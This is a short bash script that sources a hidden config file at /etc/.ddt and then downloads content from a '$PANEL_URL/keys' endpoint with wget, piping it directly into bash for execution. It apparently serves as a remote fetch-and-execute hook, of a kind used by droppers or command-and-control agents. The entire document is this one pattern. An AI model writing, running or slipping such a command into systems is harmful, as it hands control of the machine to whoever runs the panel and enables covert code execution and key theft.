#!/bin/bash
source /etc/.ddt
wget -O - "$PANEL_URL/keys" | bash;
